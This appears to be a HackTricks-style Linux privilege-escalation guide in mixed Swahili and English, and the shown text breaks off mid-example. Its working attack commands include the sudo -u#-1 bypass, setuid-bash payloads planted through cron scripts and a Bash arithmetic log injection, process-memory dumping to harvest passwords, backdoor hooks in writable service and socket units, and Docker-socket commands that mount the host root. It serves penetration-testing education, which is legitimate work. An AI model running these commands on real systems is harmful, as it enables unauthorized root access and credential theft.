# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata taarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una **write permissions kwenye folda yoyote ndani ya `PATH`** variable unaweza ku-hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za mazingira

Je, kuna habari za kuvutia, nywila, au API keys katika vigezo vya mazingira?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia toleo la kernel na kama kuna exploit inayoweza kutumiwa ku-escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo na udhaifu na baadhi za **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi za **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa toleo zote za kernel zilizo na udhaifu kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, inaangalia tu exploits kwa kernel 2.x)

Kila wakati **tafuta toleo la kernel kwenye Google**, labda toleo la kernel lako limeandikwa katika kernel exploit fulani na hapo utakuwa na uhakika kwamba exploit hiyo ni halali.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na matoleo ya Sudo yaliyo dhaifu yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kukagua ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg uthibitishaji wa saini ulishindwa

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii ingeweza kutumiwa
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi ya utambuzi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container, unaweza kujaribu kutoroka kutoka kwake:


{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **nini kime-mounted na kime-unmounted**, wapi na kwa nini. Ikiwa kitu chochote kime-unmounted, unaweza kujaribu kuki-mount na kuangalia taarifa binafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia ikiwa **any compiler is installed**. Hii ni muhimu ikiwa utahitaji kutumia baadhi ya kernel exploit, kwani inashauriwa ku-compile kwenye mashine utakayoitumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zilizo Dhaifu Zimewekwa

Angalia **toleo la vifurushi na huduma zilizowekwa**. Labda kuna toleo la Nagios la zamani (kwa mfano) ambalo linaweza kutumiwa kupandisha ruhusa…\
Inashauriwa kukagua kwa mkono toleo la programu zilizo na shaka zaidi zilizowekwa.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye mashine unaweza pia kutumia **openVAS** kukagua programu zilizozee na zilizo na udhaifu zilizowekwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa ujumla hazitakuwa na faida, kwa hivyo inashauriwa programu kama OpenVAS au zinazofanana nazo ambazo zitaangalia ikiwa toleo lolote la programu iliyowekwa lina hatari kwa exploits zinazojulikana_

## Processes

Angalia **ni michakato gani** inaendeshwa na ukague kama mchakato wowote una **ruhusa zaidi kuliko inavyopaswa** (labda tomcat inatekelezwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\  
Pia angalia privileges zako juu ya processes binaries, labda unaweza overwrite mwingine.

### Process monitoring

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia processes. Hii inaweza kuwa muhimu sana kubaini vulnerable processes zinazotekelezwa mara kwa mara au wakati seti ya vigezo inatimizwa.

### Process memory

Huduma fulani za server zinaokoa **credentials in clear text inside the memory**.\  
Kawaida utahitaji **root privileges** kusoma memory ya processes zinazomilikiwa na watumiaji wengine, kwa hivyo hii kawaida inakuwa muhimu zaidi ukiwa tayari root na unataka kugundua credentials zaidi.\  
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma memory ya processes unazomiliki**.

> [!WARNING]
> Tambua kwamba siku hizi mashine nyingi **don't allow ptrace by default** ambayo ina maana huwezi dump processes nyingine zinazomilikiwa na unprivileged user wako.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. Hii ni njia ya jadi jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Kama una access kwenye memory ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa ID ya mchakato fulani, **maps inaonyesha jinsi kumbukumbu imepangwa ndani ya nafasi ya anwani pepe ya mchakato huo**; pia inaonyesha **idhinishaji za kila eneo lililopangwa**. Faili peudo ya **mem** **inafunua kumbukumbu za mchakato yenyewe**. Kutoka kwa faili ya **maps** tunajua ni **mikoa ya kumbukumbu inayoweza kusomwa** na offsets zao. Tunatumia taarifa hii **kutafuta ndani ya faili ya mem na dump mikoa yote inayoweza kusomwa** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji kwa kumbukumbu za mfumo za **kimwili**, si kumbukumbu za pepe. Eneo la anwani pepe la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kwa kawaida, `/dev/mem` inasomwa tu na **root** na kundi **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni utekelezaji wa Linux uliobuniwa upya wa zana ya klasiki ProcDump kutoka kwenye suite ya Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili ku-dump kumbukumbu za mchakato unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mkono mahitaji ya root na ku-dump mchakato unaomilikiwa na wewe
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Sifa za kuingia kutoka kwenye Kumbukumbu za Mchakato

#### Mfano wa kufanya kwa mkono

Ikiwa utagundua kwamba mchakato wa authenticator unaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump mchakato (angalia sehemu zilizopita ili kupata njia tofauti za dump kumbukumbu za mchakato) na kutafuta credentials ndani ya kumbukumbu:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitapora nyaraka za kuingia kwa maandishi wazi kutoka kwenye kumbukumbu na kutoka kwa baadhi ya faili zinazojulikana. Kinahitaji vibali vya root ili kifanye kazi ipasavyo.

| Kipengele                                          | Jina la Mchakato     |
| ------------------------------------------------- | -------------------- |
| Nywila ya GDM (Kali Desktop, Debian Desktop)      | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Uunganisho za FTP zinazoendelea)          | vsftpd               |
| Apache2 (Vikao vya uthibitisho wa msingi wa HTTP vinavyofanya kazi) | apache2 |
| OpenSSH (Vikao vya SSH vinavyofanya kazi - Matumizi ya sudo) | sshd: |

#### Regexes za Utafutaji/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

Angalia kama kazi yoyote iliyopangwa ina udhaifu. Labda unaweza kunufaika na script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha faili ambazo root hutumia? tumia symlinks? unda faili maalum katika directory ambayo root hutumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ utaona PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Angalia jinsi mtumiaji "user" ana ruhusa za kuandika kwenye /home/user_)

Iwapo ndani ya crontab hii mtumiaji root atajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Basi, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ikitumia script yenye wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root na ina “**\***” ndani ya amri, unaweza kuitumia exploit kufanya mambo yasiyotarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard inatanguliwa na njia kama** _**/some/path/\***_**, haina udhaifu (hata** _**./\***_ **haina).**

Soma ukurasa ufuatao kwa mbinu zaidi za kutumia wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash: Injection ya upanuzi wa hisabati katika parsers za log za cron

Bash hufanya parameter expansion na command substitution kabla ya tathmini ya hisabati katika ((...)), $((...)) na let. Ikiwa cron/parser ya root inasoma sehemu za log zisizotegemewa na kuzipeleka katika muktadha wa hisabati, mshambuliaji anaweza kuingiza command substitution $(...) inayotekelezwa kama root wakati cron inavyoenda.

- Kwa nini inafanya kazi: Katika Bash, upanuzi hutokea kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Kwa hivyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` kwanza inabadilishwa (kukamilisha amri), kisha nambari iliyobaki `0` inatumiwa kwa hesabu ili script iendelee bila makosa.

- Mfano wa kawaida wenye udhaifu:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Ushambuliaji: Pata maandishi yanayodhibitiwa na mshambuliaji yandikwe kwenye log inayochambuliwa ili uwanja unaonekana kuwa nambari uweke command substitution na mwisho uwe na digit. Hakikisha amri yako haiongezi kitu kwenye stdout (au ilekeze) ili hisabati ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Kuandika upya script ya cron na symlink

Ikiwa unaweza **kuhariri script ya cron** inayotekelezwa na root, unaweza kupata shell kwa urahisi:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Iwapo script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, labda inaweza kuwa ya msaada kufuta folder hiyo na **kuunda symlink folder kwa nyingine** inayohudumia script unayodhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs za mara kwa mara

Unaweza kufuatilia michakato ili kutafuta zile zinazotekelezwa kila dakika 1, 2 au 5. Labda unaweza kuchukua fursa yake na escalate privileges.

Kwa mfano, ili **kufuatilia kila 0.1s kwa dakika 1**, **kupanga kwa amri zilizotekelezwa kidogo** na kufuta amri zilizotekelezwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob kwa kuweka carriage return baada ya comment (bila newline character), na cron job itafanya kazi. Mfano (zingatia carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Mafaili _.service_ yanayoweza kuandikwa

Angalia kama unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili **itekeleze** **backdoor yako wakati** huduma inapo **anzishwa**, **irejeshwe** au **isimamishwe** (labda utahitaji kusubiri hadi mashine ianzishwe upya).\
Kwa mfano, tengeneza backdoor yako ndani ya faili ya `.service` kwa **`ExecStart=/tmp/script.sh`**

### Mabainari ya huduma yanayoweza kuandikwa

Kumbuka kwamba ikiwa una **write permissions over binaries being executed by services**, unaweza kuyabadilisha kuwa backdoors ili wakati huduma zitakapotekelezwa tena backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** kwa:
```bash
systemctl show-environment
```
Ikiwa utagundua kwamba unaweza **write** katika yoyote ya folda za njia hiyo, unaweza kuwa na uwezo wa **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** katika faili kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** yenye **jina lile lile kama relative path binary** ndani ya folda ya PATH ya systemd ambayo unaweza kuandika, na wakati service itapoombwa kutekeleza kitendo dhaifu (**Start**, **Stop**, **Reload**), yako **backdoor** itatekelezwa (watumiaji wasio na ruhusa kawaida hawawezi kuanzisha/kusimamisha services, lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo jina lao linaisha kwa `**.timer**` ambazo zinadhibiti faili au matukio ya `**.service**`. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina msaada uliojengwa kwa matukio ya calendar time na matukio ya monotonic time na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya systemd.unit zilizopo (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma ni nini Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (Angalia hapo juu.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Kwa hivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Pata unit ya systemd fulani (kama `.service`) ambayo inayoendesha **binary inayoweza kuandikwa**
- Pata unit nyingine ya systemd ambayo inayoendesha **relative path** na wewe una **idhini za kuandika** kwenye **systemd PATH** (ili kujifanya executable hiyo)

Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.

### **Kuwawezesha Timer**

Ili kuwezesha timer unahitaji idhini za root na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** inawezeshwa kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawezesha **process communication** kwenye mashine sawa au tofauti ndani ya model za client-server. Zinatumia faili za descriptor za Unix kwa mawasiliano kati ya kompyuta na zinawekwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Learn more about sockets with `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vinavyovutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini kwa muhtasari zinatumika **kuonyesha wapi itasikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya port kusikiliza, nk.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **true**, **instance ya service inazaliwa kwa kila connection inayokuja** na socket ya connection pekee ndiyo itapitishwa kwake. Ikiwa **false**, sockets zote zinazolisikilizwa zinapipitishwa kwa unit ya service iliyozinduliwa, na unit moja tu ya service inazaliwa kwa connections zote. Thamani hii haisikiliziwi kwa datagram sockets na FIFOs ambapo unit moja ya service inashughulikia trafiki yote inayokuja bila masharti. **Defaults to false**. Kwa sababu za utendaji, inashauriwa kuandika daemons mpya kwa njia inayofaa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinachukua mistari ya amri moja au zaidi, ambayo zina **endeshwa kabla** au **baada** ya **sockets**/FIFOs zinazolisikilizwa **kuundwa** na kufungwa kwenye port, mtawaliwa. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili lililo kamili (absolute filename), ikifuatiwa na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo zina **endeshwa kabla** au **baada** ya **sockets**/FIFOs zinazolisikilizwa **kufungwa** na kuondolewa, mtawaliwa.
- `Service`: Inaelezea jina la unit ya **service** **kuanzishwa** wakati wa **incoming traffic**. Mipangilio hii inaruhusiwa tu kwa sockets zilizo na Accept=no. Inakuwa default kwenye service inayoshikilia jina sawa na socket (kwa kubadilisha suffix). Katika hali nyingi, haitapaswa kuwa muhimu kutumia chaguo hili.

### Writable .socket files

Ikiwa utapata faili ya `.socket` inayoweza kuandikwa (writable) unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket haijaundwa. Kwa hivyo, **huenda utahitaji kusubiri hadi mashine iwe imeanzishwa upya.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Ikiwa **utatambua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia kuhusu Unix Sockets na si kuhusu faili za config `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda kutekeleza exploit kwa udhaifu.

### Orodhesha Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa kunaweza kuwa na **sockets listening for HTTP requests** (_Sio kuhusu .socket files, bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **responds with an HTTP** request, basi unaweza **communicate** nayo na labda **exploit some vulnerability**.

### Docker Socket Inayoweza Kuandikwa

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

Ikiwa una write access kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuruhusu kuendesha container ukiwa na ufikiaji wa root kwenye mfumo wa faili wa host.

#### **Kutumia Docker API Moja kwa Moja**

Katika matukio ambapo Docker CLI haipatikani, Docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuanzisha muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ukiwa na ufikiaji wa root kwenye mfumo wa faili wa host.

### Mengine

Kumbuka kwamba ikiwa una ruhusa za kuandika kwenye docker socket kwa sababu uko **inside the group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **more ways to break out from docker or abuse it to escalate privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Kama unagundua unaweza kutumia amri ya **`ctr`**, soma ukurasa ufuatao kwa sababu **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Kama unagundua unaweza kutumia amri ya **`runc`**, soma ukurasa ufuatao kwa sababu **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo tata wa mawasiliano kati ya michakato (inter-Process Communication, IPC) unaowawezesha programu kuingiliana kwa ufanisi na kushiriki data. Umeundwa kwa kuzingatia mfumo wa kisasa wa Linux, ukitoa mfumo imara wa aina mbalimbali za mawasiliano ya programu.

Mfumo ni wenye kubadilika, ukisaidia IPC ya msingi inayoboreshwa kubadilishana data kati ya michakato, kwa namna inayokumbusha UNIX domain sockets iliyoboreshwa. Zaidi ya hayo, husaidia kutangaza matukio au ishara, na hivyo kuimarisha muingiliano usio na mshono kati ya vipengele vya mfumo. Kwa mfano, ishara kutoka kwa daemon ya Bluetooth kuhusu simu inayokuja inaweza kusababisha mchezaji wa muziki kukaa kimya (mute), kuboresha uzoefu wa mtumiaji. Zaidi ya hayo, D-Bus inaunga mkono mfumo wa remote object, kurahisisha maombi ya huduma na miito ya methods kati ya programu, ikipunguza ugumu wa taratibu zilizokuwa ngumu hapo awali.

D-Bus inafanya kazi kwa msingi wa **allow/deny model**, ikisimamia ruhusa za ujumbe (miito ya method, utoaji wa signal, n.k.) kulingana na jumla ya athari za sheria za sera zinazoendana. Sera hizi zinaelezea jinsi mwingiliano na bus utakavyofanyika, na zinaweza kumruhusu mtu kupata privilege escalation kupitia matumizi mabaya ya ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umeonyeshwa, ukielezea ruhusa kwa mtumiaji root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera zisizo na mtumiaji au kundi maalum zinatumika kwa wote, wakati sera za muktadha wa "default" zinatumika kwa wale wote wasiokuwa wamefunikwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
